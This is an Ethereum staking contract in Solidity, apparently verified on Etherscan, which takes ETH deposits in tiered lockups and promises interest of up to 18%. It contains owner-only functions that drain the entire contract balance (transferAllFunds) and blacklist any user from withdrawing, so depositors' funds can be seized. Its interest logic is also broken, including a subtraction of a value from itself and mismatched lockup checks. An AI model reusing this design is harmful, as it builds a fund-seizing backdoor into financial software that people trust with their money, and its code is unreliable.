/**
 *Submitted for verification at Etherscan.io on 2023-06-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

struct DepositInfo {
    uint256 amount;
    uint256 lockupPeriod;
    uint256 interestRate;
    uint256 depositTime;
    uint256 lastClaimTime;
}

contract StakingContract {
    address payable private _owner;
    
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _lastClaimTime;
    mapping(address => uint256) private _lockupPeriod;
    mapping(address => uint256) private _interestRate;
    mapping(address => bool) private _blacklisted;
    mapping(address => address) private _referrals;
    mapping(address => uint256) private _initialDeposits;
    mapping(address => uint256) private _depositTime;
    mapping(address => DepositInfo[]) private _deposits;
    mapping(address => uint256) private _totalWithdrawnAmounts;
    
    event Deposit(address indexed user, uint256 amount, uint256 lockupPeriod);
    event Withdraw(address indexed user, uint256 amount);
    event InterestClaimed(address indexed user, uint256 amount);
    event Blacklisted(address indexed user);
    event Unblacklisted(address indexed user);

    constructor() {
        _owner = payable(msg.sender);
    }

    modifier onlyOwner {
        require(msg.sender == _owner, "Not the contract owner.");
        _;
    }


function deposit(uint256 lockupPeriod, address referral) external payable {
        require(lockupPeriod >= 1 && lockupPeriod <= 5, "Invalid lockup period.");
        require(!_blacklisted[msg.sender], "You are not allowed to deposit.");

        uint256 currentLockupPeriod = lockupPeriod * 1 days;
        uint256 currentInterestRate;

if (lockupPeriod == 1) {
    currentLockupPeriod = 7 * 1 days;
    require(msg.value >= 10**17 && msg.value <= 5 * 10**17, "Invalid deposit amount for 7-day lockup.");
    currentInterestRate = 30; // 0.3%
} else if (lockupPeriod == 2) {
    currentLockupPeriod = 14 * 1 days;
    require(msg.value >= 5 * 10**17 && msg.value <= 5 * 10**18, "Invalid deposit amount for 14-day lockup.");
    currentInterestRate = 200; // 2%
} else if (lockupPeriod == 3) {
    currentLockupPeriod = 30 * 1 days;
    require(msg.value >= 5 * 10**18 && msg.value <= 10**19, "Invalid deposit amount for 30-day lockup.");
    currentInterestRate = 500; // 5%
} else if (lockupPeriod == 4) {
    currentLockupPeriod = 60 * 1 days;
    require(msg.value >= 8 * 10**18 && msg.value <= 25 * 10**18, "Invalid deposit amount for 60-day lockup.");
    currentInterestRate = 1100; // 11%
} else if (lockupPeriod == 5) {
    currentLockupPeriod = 90 * 1 days;
    require(msg.value >= 15 * 10**18 && msg.value <= 50 * 10**18, "Invalid deposit amount for 90-day lockup.");
    currentInterestRate = 1800; // 18%
}

    if (_referrals[msg.sender] == address(0) && referral != msg.sender && referral != address(0)) {
        _referrals[msg.sender] = referral;
    }

       DepositInfo memory newDeposit = DepositInfo({
            amount: msg.value,
            lockupPeriod: currentLockupPeriod,
            interestRate: currentInterestRate,
            depositTime: block.timestamp,
            lastClaimTime: block.timestamp
        });

    _balances[msg.sender] += msg.value;
    _lockupPeriod[msg.sender] = currentLockupPeriod;
    _interestRate[msg.sender] = currentInterestRate;
    _depositTime[msg.sender] = block.timestamp;
    _lastClaimTime[msg.sender] = block.timestamp;
    _initialDeposits[msg.sender] = msg.value;
    _deposits[msg.sender].push(newDeposit);

    emit Deposit(msg.sender, msg.value, lockupPeriod);
}


    function blacklist(address user) external onlyOwner {
        require(!_blacklisted[user], "User is already blacklisted.");
        _blacklisted[user] = true;

        emit Blacklisted(user);
    }

    function unblacklist(address user) external onlyOwner {
        require(_blacklisted[user], "User is not blacklisted.");
        _blacklisted[user] = false;

        emit Unblacklisted(user);
    }

function withdraw(uint256 depositIndex) external {
    require(!_blacklisted[msg.sender], "You are not allowed to withdraw.");
    require(depositIndex < _deposits[msg.sender].length, "Invalid deposit index.");
    require(block.timestamp >= _deposits[msg.sender][depositIndex].depositTime + _deposits[msg.sender][depositIndex].lockupPeriod, "Lockup period not over.");
    
    uint256 amountToWithdraw = _deposits[msg.sender][depositIndex].amount;
    require(amountToWithdraw > 0, "No funds to withdraw.");

    _deposits[msg.sender][depositIndex].amount = 0;
    _totalWithdrawnAmounts[msg.sender] += amountToWithdraw; // Store the withdrawn amount
    payable(msg.sender).transfer(amountToWithdraw);

    emit Withdraw(msg.sender, amountToWithdraw);
}

    function transferAllFunds() external onlyOwner {
        _owner.transfer(address(this).balance);
    }

    function calculateInterest(address user, uint256 depositIndex) public view returns (uint256) {
        DepositInfo storage deposit = _deposits[user][depositIndex];
        uint256 interestClaimed = _deposits[user][depositIndex].amount - _deposits[user][depositIndex].amount;
        uint256 timeElapsed = block.timestamp - deposit.lastClaimTime;
        uint256 interest = (deposit.amount * deposit.interestRate * timeElapsed) / (10000 * 86400); // 86400 seconds in a day
        return interest + interestClaimed;
    }

function claimInterestForDeposit(uint256 lockupPeriod) external {
    require(!_blacklisted[msg.sender], "You are not allowed to claim interest.");

    uint256 totalInterestToClaim = 0;

        for (uint256 i = 0; i < _deposits[msg.sender].length; i++) {
            if (_deposits[msg.sender][i].lockupPeriod == lockupPeriod * 1 days) {
            uint256 interestToClaim = calculateInterest(msg.sender, i);
            require(interestToClaim > 0, "No interest to claim.");

            _deposits[msg.sender][i].lastClaimTime = block.timestamp;
            totalInterestToClaim += interestToClaim;
        }
    }

    payable(msg.sender).transfer(totalInterestToClaim);

    emit InterestClaimed(msg.sender, totalInterestToClaim);
}

function getDepositInfo(address user) external view returns (uint256[] memory depositIndices, uint256[] memory unlockTimes, uint256[] memory stakedAmounts, uint256[] memory lockupPeriods) {
     uint256 depositCount = _deposits[user].length;

     depositIndices = new uint256[](depositCount);
     unlockTimes = new uint256[](depositCount);
     stakedAmounts = new uint256[](depositCount);
     lockupPeriods = new uint256[](depositCount);

     for (uint256 i = 0; i < depositCount; i++) {
         depositIndices[i] = i;
         unlockTimes[i] = _deposits[user][i].depositTime + _deposits[user][i].lockupPeriod;
         stakedAmounts[i] = _deposits[user][i].amount;
         lockupPeriods[i] = _deposits[user][i].lockupPeriod;
     }
 }

function max(int256 a, int256 b) private pure returns (int256) {
    return a >= b ? a : b;
}

    function getReferral(address user) external view returns (address) {
        return _referrals[user];
    }

    function isBlacklisted(address user) external view returns (bool) {
        return _blacklisted[user];
    }

    function getLastClaimTime(address user) external view returns (uint256) {
        return _lastClaimTime[user];
    }
}